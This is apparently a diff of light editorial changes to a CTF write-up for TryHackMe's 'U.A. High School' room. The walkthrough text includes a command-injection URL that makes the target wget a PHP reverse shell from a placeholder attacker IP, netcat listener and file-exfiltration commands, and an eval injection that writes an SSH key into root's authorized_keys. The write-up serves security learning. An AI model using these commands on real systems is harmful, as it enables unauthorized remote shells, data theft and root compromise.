@@ -157,7 +157,7 @@ On your attacker machine, make sure you are in the same directory as your revers
 
 In the same directory, use `python3 -m http.server 80` so that your shell can be accessed through HTTP.
 
-Now, return to Firefox. You should still be viewing **http://ua.thm/assets/index.php?cmd=whoami**. Replace this with **http://ua.thm/assets/index.php?cmd=wget http://{ATTACKER-IP}/php-reverse-shell.php.** (Note that ATTACKER-IP should be replaced with the IP of your attacker machine.) In essence, we just used our remote command execution to download our shell onto the target machine.
+Now, return to Firefox. You should still be viewing **http://ua.thm/assets/index.php?cmd=whoami**. Replace this with **http://ua.thm/assets/index.php?cmd=wget http://{ATTACKER-IP}/php-reverse-shell.php.** (Note that ATTACKER-IP should be replaced with the IP of your attacker machine.) In essence, we just used our remote command execution to download our php onto the target machine.
 
 On your attacker machine, use `CTRL+C` to stop your Python server. Then enter `nc -nvlp 1234` to create a listener for your reverse shell.
 
@@ -170,7 +170,7 @@ If you need more explanation, please read this section. If not, feel free to ski
 
 Let's start by accepting that we don't need to understand how our PHP script works. It is a commonly used tool in CTFs, and using it is simple as long as you update the IP address to reflect your own IP.
 
-`python3 -m http.server 80': This command is starting a web server on our machine. Think of it this way: we (the attackers) are offering the victim the opportunity to download our PHP script.
+`python3 -m http.server 80`: This command is starting a web server on our machine. Think of it this way: we (the attackers) are offering the victim the opportunity to download our PHP script.
 
 **http://ua.thm/assets/index.php?cmd=wget http://{ATTACKER-IP}/php-reverse-shell.php**: Now that we've offered the script to the victim, this URL causes the victim to accept and download that script. Breaking this down, `wget` is a command to download something from a remote location, **{ATTACKER-IP}** specifies where the download comes from, and **php-reverse-shell.php** specifies what file is being downloaded. Now, our script should be present in the **/assets** directory of the victim machine.
 
@@ -187,7 +187,7 @@ It is now time for privilege escalation -- moving from user **www-data** to some
 
 Since these efforts did not work, I decided to take stock of what user **www-data** can do. In CTFs, **www-data** can often view sensitive files in the directory **/var/www**. I entered `cd /var/www` to access this directory, then used `ls -la` to view the files that were present. The directory **Hidden_Content** looked suspicious, so I entered `cd Hidden_Content` and then `ls -la` to view its contents.
 
-You should see a suspicious file called **passphrase.txt**. Enter `cat passphrase.txt` to view its contents, and you will see a Base-64 encoded password. Due to the rules of TryHackMe writeups, I cannot include the encrypted password or the plaintext password here. However, pasting the encrypted password into **CyberChef**'s input field and using magic should give you the plaintext passphrase. I'd suggest writing this passphrase down somewhere; for the rest of the writeup, I will call it **PASSWORD1**.
+I then saw a suspicious file called **passphrase.txt**. Enter `cat passphrase.txt` to view its contents, and you will see a Base-64 encoded password. Due to the rules of TryHackMe writeups, I cannot include the encrypted password or the plaintext password here. However, pasting the encrypted password into **CyberChef**'s input field and using magic should give you the plaintext passphrase. I'd suggest writing this passphrase down somewhere; for the rest of the writeup, I will call it **PASSWORD1**.
 
 ## Hitting a roadblock and using a hint
 This section of the writeup covers a failed attempt at switching to a different user. Feel free to skip this section; however, I wanted to include it because it is an important part of how I found the solution.
@@ -212,14 +212,14 @@ I recalled that only one image was used in the victim's website, meaning one of 
 
 `nc -l -p 4444 > oneforall.jpg' (on my attacker machine)
 
-'nc -w 3 {ATTACKER-IP} 4444 < oneforall.jpg' (on the victim machine; remember to replace ATTACKER-IP with your individual attacker IP.
+'nc -w 3 {ATTACKER-IP} 4444 < oneforall.jpg' (on the victim machine; remember to replace ATTACKER-IP with your individual attacker IP.)
 
 **Note**: Like the PHP script earlier, you don't have to understand the workings of these commands. Even I had to use Nakkaya.com as a reference (https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/). Long story short, remember that **these commands are moving the image to our machine** for further analysis.
 
 ## Steganography (finding hidden data in an image)
-On my attacker machine, I double clicked **oneforall.jpg** to display my image. To my surprise, I received this message: **"Error interpreting JPEG image file (Not a JPEG file: starts with 0x89 0x50)."**
+On my attacker machine, I double clicked **oneforall.jpg** to display the image. To my surprise, I received this message: **"Error interpreting JPEG image file (Not a JPEG file: starts with 0x89 0x50)."**
 
-From this message, I deduced that there was an issue with the file signature of **oneforall.jpg**. Using exiftool (`exiftool oneforall.jpg`) confirmed this, as it listed the file type as PNG, not JPEG. I used Wikipedia to view the file signatures for PNG and JPEG, then made the proper adjustments in hexedit on my local machine.
+From this message, I deduced that there was an issue with the file signature of **oneforall.jpg**. Using **exiftool** (`exiftool oneforall.jpg`) confirmed this, as it listed the file type as PNG, not JPEG. I used Wikipedia to view the file signatures for PNG and JPEG, then made the proper adjustments in hexedit on my local machine.
 
 Here are the steps to do so:
 
@@ -231,7 +231,7 @@ Here are the steps to do so:
 
 Now, double clicking **oneforall.jpg** should display an image properly. This means we have successfully fixed this JPEG image!
 
-Since we have fixed the image, we can now extract information from it. In the same directory as **oneforall.jpg**, enter `steghide extract -sf oneforall.jpg` to extract hidden files from the image. When prompted for a passphrase, enter PASSWORD1.
+Since we have fixed the image, we can now extract information from it. In the same directory as **oneforall.jpg**, enter `steghide extract -sf oneforall.jpg` to extract hidden files from the image. When prompted for a passphrase, enter **PASSWORD1**.
 
 It worked! We received a message: **wrote extracted data to "creds.txt"**
 
@@ -251,12 +251,12 @@ Here is a deeper explanation if anyone needs it:
 `steghide extract -sf oneforall.jpg`: The `steghide extract -sf` command is often used to extract data from a JPEG file. In this case, it revealed creds.txt, which we read using `cat`.
 
 ## SSH into the system as deku
-Although we ignored SSH earlier, it is now a viable means of entry since we have credentials for user deku. Enter `ssh deku@ua.thm`, and enter PASSWORD2 when prompted. We are now logged into the victim machine as user deku, which will hopefully open a route for us to become root (the user with the greatest authority).
+Although we ignored SSH earlier, it is now a viable means of entry since we have credentials for user **deku**. Enter `ssh deku@ua.thm`, and enter **PASSWORD2** when prompted. We are now logged into the victim machine as user **deku**, which will hopefully open a route for us to become **root** (the user with the greatest authority).
 
 We can now enter `cat user.txt` to obtain the flag.
 
 ## Checking sudo privileges
-The **sudo** command allows one user to run commands as another user, although there are usually rules in place governing how this works on a given machine. To view those rules, we must enter `sudo -l`. If necessary, re-enter PASSWORD2.
+The **sudo** command allows one user to run commands as another user, although there are usually rules in place governing how this works on a given machine. To view those rules, we must enter `sudo -l`. If necessary, re-enter **PASSWORD2**.
 
 I found this part of the output intriguing:
 
@@ -296,14 +296,15 @@ Let's analyze this script:
 
 1) `read feedback`: The script is reading user input and storing it in the variable called **feedback**. This means we can interact with this script and (hopefully) exploit it.
 
-2) `[[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]`: Clearly, this script is blocking the user from inputting certain characters.
+
+2) ```[[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]```: Clearly, this script is blocking the user from inputting certain characters.
 
 3) `eval "echo $feedback"`: The eval function means that the expression `"echo $feedback"` is being evaluated. (Note that **$feedback** means we are taking the *value* of **feedback**, and that value is whatever we entered when running the program.)
 
 **The key point of this script** is that we can provide malicious input so that the **eval** function performs a command that helps us get root access.
 
 ## Exploiting eval:
-Again, we are trying to exploit the line from **feedback.sh** which reads `eval "echo $feedback"`. In the early stages, I made a key mistake: ignoring the **echo** command. For those who are unfamiliar, **echo** is a fairly harmless command which prints text to the screen. I made multiple attempts at command substitution, but they were foiled by the script's refusal to allow input containing parenthesis.
+Again, we are trying to exploit the line from **feedback.sh** which reads `eval "echo $feedback"`. In the early stages, I made a key mistake: ignoring the **echo** command. For those who are unfamiliar, **echo** is a fairly harmless command which prints text to the console. I made multiple attempts at command substitution, but they were foiled by the script's refusal to allow input containing parenthesis.
 
 My fortunes changed once I Googled **"echo GTFOBins."** (GTFOBins is a website providing tips for privilege escalation; I have used it in approximately 50% of the CTFs I have completed.) Anyways, GTFOBins did not have a designated page about **echo**, but the **echo** command was mentioned a few times in their page regarding Bash.
 
@@ -312,10 +313,10 @@ I was initially overambitious and considered their file read command, but this w
 export LFILE=file_to_write
 bash -c 'echo DATA > $LFILE'
 ```
-I have already seen another writeup which used this trick to add a line to the sudoers file, but I chose to use this trick to add my SSH key to the authorized_keys for root. Continue to the next section to learn more about this process.
+I have already seen another writeup which used this trick to add a line to the sudoers file, but I chose to add my SSH key to the authorized_keys for root. Continue to the next section to learn more about this process.
 
 ## Creating SSH keys
-On your attacker machine, you can generate SSH keys by using the command `ssh-keygen -t rsa -b 4096 -f LOCATION/id_rsa`. (Note that I am using LOCATION as a representation for whatever location you might choose. If you're having trouble deciding, try **~/.ssh**.)
+On your attacker machine, you can generate SSH keys by using the command `ssh-keygen -t rsa -b 4096 -f LOCATION/id_rsa`. (Note that I am using LOCATION as a placeholder for whatever location you might choose. If you're having trouble deciding, try **~/.ssh**.)
 
 This should output two files: **id_rsa** and **id_rsa.pub**. Enter the command `cat id_rsa.pub`, then copy the resulting public key to your clipboard.
 
@@ -333,9 +334,9 @@ Now, it's time to test whether this worked. On your attacker machine, in the dir
 You now have root access, and you can use `cat /root/root.txt` to claim the final flag!
 
 ## Exploiting SSH keys explained
-If you understood the previous section, feel free to exit this walkthrough -- you have now become the number one hero at U.A. High School! If you're still unsure, here's the explanation:
+If you understood the previous section, feel free to exit this walkthrough -- **you have now become the number one hero at U.A. High School!** If you're still unsure, here's the explanation:
 
-**SSH keys**: When attempting to SSH into a system as some user (designated X), you usually have two options: give the password belonging to X or use an SSH key. In the case of this CTF, we don't have **root**'s password, so it makes sense to use an SSH key.
+**SSH keys**: When attempting to SSH into a system as some user, you usually have two options: give the password belonging to that user or use an SSH key. In the case of this CTF, we don't have **root**'s password, so it makes sense to use an SSH key.
 
 `KEY > /root/.ssh/authorized_keys`: Once this payload is submitted as input, **feedback.sh** will run the following line: `eval "echo KEY > /root/.ssh/authorized_keys"`. Let's break this down:
 
@@ -347,12 +348,12 @@ If you understood the previous section, feel free to exit this walkthrough -- yo
 
 ## Conclusion
 This was very involved for an "Easy" room, and it seemed to cross over into "Medium" territory at times. Here are some of the key takeaways:
-- Most CTFs begin with an Nmap scan to view open ports, and this was no exception.
-- HTTP provides a larger attack surface than SSH.
-- Gobuster can help you find directories and files that have accidentally been made public.
-- Keep an eye out for suspicious PHP files when doing CTFs.
-- Hexedit is a useful tool for "fixing" images that are showing the wrong file type.
-- Steghide is great at extracting hidden files from JPEG images.
+- Most CTFs begin with an **Nmap** scan to view open ports, and this was no exception.
+- **HTTP** provides a larger attack surface than **SSH**.
+- **Gobuster** can help you find directories and files that have accidentally been made public.
+- Keep an eye out for suspicious **PHP** files when doing CTFs.
+- **Hexedit** is a useful tool for "fixing" images that are showing the wrong file type.
+- **Steghide** is great at extracting hidden files from JPEG images.
 - The **eval** function is often exploitable.
 
-Thank you for reading! Good luck with your cybersecurity journey, and God bless!
+### Thank you for reading! Good luck with your cybersecurity journey, and God bless!
